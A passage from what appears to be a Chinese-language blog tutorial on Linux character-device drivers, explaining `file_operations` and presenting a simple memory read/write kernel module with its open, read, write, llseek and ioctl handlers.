class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span></span>;</span><br><span class="line">    <span class="built_in">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **);</span><br><span class="line">    <span class="built_in">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="built_in">int</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>下面对 <code>file_operations</code> 结构体中的主要成员简要介绍：
<code>llseek()</code>
函数用来修改一个文件的当前读写位置，并将新位置返回，在出错时，这个函数返回一个负值。
<code>read()</code>
函数用来从设备中读取数据，成功时函数返回读取的字节数，出错时返回一个负值。
<code>write()</code>
函数向设备发送数据，成功时该函数返回写入的字节数。如果次函数未被实现，当用户进行
<code>write()</code> 系统调用时，将得到 <code>-EINVAL</code> 返回值。
<code>unlocked_ioctl()</code>
提供设备相关控制命令的实现，当调用成功时，返回给调用程序一个非负值。</p>
<h3 id="字符设备驱动组成">字符设备驱动组成</h3>
<p>这里以一个简单的<a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/LKMs_test/dev_test" >内存读写驱动<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>为例。</p>
<h4 id="头文件宏及设备结构体">头文件、宏及设备结构体</h4>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_major = <span class="number">230</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_minor = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_param</span>(hello_major, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"><span class="built_in">module_param</span>(hello_minor, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hello_dev</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">cdev</span> cdev;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br></pre></td></tr></table></figure></div>
<h4 id="加载与卸载设备驱动">加载与卸载设备驱动</h4>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = <span class="built_in">MKDEV</span>(hello_major, hello_minor);</span><br><span class="line">    <span class="keyword">if</span> (hello_major)</span><br><span class="line">        ret = <span class="built_in">register_chrdev_region</span>(devno, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = <span class="built_in">alloc_chrdev_region</span>(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">        hello_major = <span class="built_in">MAJOR</span>(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">    hello_devp = <span class="built_in">kzalloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> hello_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!hello_devp) &#123;</span><br><span class="line">        <span class="built_in">unregister_chrdev_region</span>(devno, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cdev_init</span>(&amp;hello_devp-&gt;cdev, &amp;hello_fops);</span><br><span class="line">    hello_devp-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="type">int</span> err = (<span class="type">int</span>) <span class="built_in">cdev_add</span>(&amp;hello_devp-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="built_in">printk</span>(<span class="string">&quot;[-] Error %d adding myko %d\n&quot;</span>, err, hello_minor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cdev_del</span>(&amp;hello_devp-&gt;cdev);</span><br><span class="line">    <span class="built_in">kfree</span>(hello_devp);</span><br><span class="line">    <span class="built_in">unregister_chrdev_region</span>(<span class="built_in">MKDEV</span>(hello_major, hello_minor), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure></div>
<p><code>cdev_init</code> 初始化 <code>cdev</code> 结构体，其中与驱动的
<code>cdev</code> 关联的 <code>file_operations</code> 结构体如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">file_operations</span> hello_fops = &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h4 id="使用文件私有数据">使用文件私有数据</h4>
<p>大多数Linux驱动遵循一个”潜规则”，那就是将文件的私有数据
<code>private_data</code> 指向设备结构体，再用
<code>read()</code>、<code>write()</code>、<code>ioctl()</code>、<code>llseek()</code>
等函数通过 <code>private_data</code> 访问设备结构体。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = hello_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="读写函数">读写函数</h4>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_to_user</span>(buf, dev-&gt;mem + *pos, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Read %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(dev-&gt;mem + *pos, buf, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Written %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于用户空间不能直接访问内核空间的内存，因此借助了函数
<code>copy_from_user()</code>
完成用户空间缓冲区到内核空间的复制，<code>copy_to_user()</code>
完成内核空间到用户空间缓冲区的复制。它们的原型如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">copy_from_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> __user *from, <span class="type">unsigned</span> <span class="type">long</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> count)</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>完全复制成功返回值为 0 ，如果复制失败，则返回负值。 读和写函数中的
<code>__user</code>
是一个宏，表明其后的指针指向用户空间，实际上更多地充当了代码自注释功能。</p>
<h4 id="seek函数">seek函数</h4>
<p><code>seek()</code>
函数对文件定位的起始地址可以是文件开头（SEEK_SET，0）、当前位置（SEEK_CUR，1）和文件尾（SEEK_END，2），这里只实现了支持从文件开头和当前位置的相对偏移。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">loff_t</span> <span class="title">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">0</span> &amp;&amp; op != <span class="number">1</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) offset += filp-&gt;f_pos;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; MAX_SIZE) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> filp-&gt;f_pos = offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="ioctl函数">ioctl函数</h4>
<p>用来自定义的函数，这里自定义了清内存的函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;[-] No device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, <span class="built_in">sizeof</span>(dev-&gt;mem));</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[+] Clear success\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[-] Error command\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="完整代码">完整代码</h3>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_major = <span class="number">230</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_minor = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_param</span>(hello_major, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"><span class="built_in">module_param</span>(hello_minor, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hello_dev</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">cdev</span> cdev;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">loff_t</span> <span class="title">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">file_operations</span> hello_fops = &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = <span class="built_in">MKDEV</span>(hello_major, hello_minor);</span><br><span class="line">    <span class="keyword">if</span> (hello_major)</span><br><span class="line">        ret = <span class="built_in">register_chrdev_region</span>(devno, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = <span class="built_in">alloc_chrdev_region</span>(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">        hello_major = <span class="built_in">MAJOR</span>(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">    hello_devp = <span class="built_in">kzalloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> hello_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!hello_devp) &#123;</span><br><span class="line">        <span class="built_in">unregister_chrdev_region</span>(devno, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cdev_init</span>(&amp;hello_devp-&gt;cdev, &amp;hello_fops);</span><br><span class="line">    hello_devp-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="type">int</span> err = (<span class="type">int</span>) <span class="built_in">cdev_add</span>(&amp;hello_devp-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="built_in">printk</span>(<span class="string">&quot;[-] Error %d adding myko %d\n&quot;</span>, err, hello_minor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cdev_del</span>(&amp;hello_devp-&gt;cdev);</span><br><span class="line">    <span class="built_in">kfree</span>(hello_devp);</span><br><span class="line">    <span class="built_in">unregister_chrdev_region</span>(<span class="built_in">MKDEV</span>(hello_major, hello_minor), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = hello_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;[-] No device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, <span class="built_in">sizeof</span>(dev-&gt;mem));</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[+] Clear success\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[-] Error command\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, 